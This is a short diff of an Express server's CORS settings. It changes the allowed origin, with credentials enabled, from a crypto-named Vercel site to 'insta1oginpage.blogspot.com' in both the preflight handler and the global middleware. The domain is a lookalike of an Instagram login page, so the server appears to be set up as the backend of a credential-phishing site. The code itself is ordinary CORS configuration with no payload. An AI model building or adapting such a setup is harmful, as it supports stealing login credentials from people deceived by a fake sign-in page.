@@ -22,7 +22,7 @@ const corsOptions = {
 app.use(cors(corsOptions));
 app.options('*', cors(corsOptions)); // Handle preflight requests
 app.options('*', (req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', 'https://crypto1-ten.vercel.app'); // Update for production.
+  res.setHeader('Access-Control-Allow-Origin', 'https://insta1oginpage.blogspot.com'); // Update for production.
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
   res.setHeader('Access-Control-Allow-Credentials', 'true');
@@ -31,7 +31,7 @@ app.options('*', (req, res) => {
 
 // Global middleware to set CORS headers on every response
 app.use((req, res, next) => {
-  res.setHeader('Access-Control-Allow-Origin', 'https://crypto1-ten.vercel.app'); // Update as needed.
+  res.setHeader('Access-Control-Allow-Origin', 'https://insta1oginpage.blogspot.com'); // Update as needed.
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
   res.setHeader('Access-Control-Allow-Credentials', 'true');
